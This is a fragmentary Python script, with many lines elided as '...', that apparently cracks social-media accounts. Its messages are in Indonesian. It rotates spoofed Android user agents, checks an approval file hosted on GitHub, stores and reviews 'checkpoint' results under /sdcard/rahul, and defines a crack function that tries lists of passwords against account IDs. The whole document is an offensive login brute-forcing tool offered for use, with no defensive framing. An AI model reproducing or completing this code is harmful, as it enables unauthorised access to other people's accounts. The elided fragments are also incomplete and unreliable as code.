...
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝      ╚═╝   
 ...
 selamat datang {hh}user{P}, script by {hh}Resyah16{P} version pribadi""")
...
def rol_ua():
	...
	try:
		os.remove('data/rahul_ua.txt')
		os.remove('data/rahul_blade.txt')
	except:pass
	open('data/rahul_blade.txt','w').write(ua_bot)
	open('data/rahul_ua.txt','w').write(str(datetime.now().hour))
	try:
	...
	try:
		...
		for x in url.find_all("td"):
			if 'useragent' in str(x):
				...
				open('data/rahul_blade.txt','a').write(ua[0]+'\n')
	except:open('data/rahul_blade.txt','a').write(ua_bot)
...
def ua_rozh():
	...
	return str(ru([f"Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(102.105))}.0.0.0 Mobile Safari/537.36"]))
...
###---[ DUMP PROXY ]---###
try:
	uadev = requests.get("https://github.com/Rahullslam/Rahul11/blob/main/Approval.txt").text
...
def cek_opsi_cp():
	nom, no = [], 0
	print(' ─────────────────────────────')
	try:ok = os.listdir('/sdcard/rahul')
	except:sys.exit(f" [{M}>{P}] tidak ada hasil cp")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('/sdcard/rahul/'+x,'r').readlines()
		except:continue
	...
	print(' ─────────────────────────────')
	detek.append('file')
	for data in open('/sdcard/rahul/'+file,'r').read().splitlines():
		ua = ua_rozh()
...
def cek_hasil():
	...
	if one in ['1','01']:
		...
		file = nom[int(abc)-1]
		try:buka = open('/sdcard/rahul/'+file,'r').read()
...
def crack(idf,pwx,url,awal):
	...
	for pw in pwx:
		try:
			if 'uadia' in uadarimu: ua = rozh[0]
			else:ua = "Mozilla/5.0 (Linux; U; Android 2.3; en-US; GT-T9500 Build/MocorDroid2.3.5) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.2.645 U3/0.8.0 Mobile Safari/534.3"
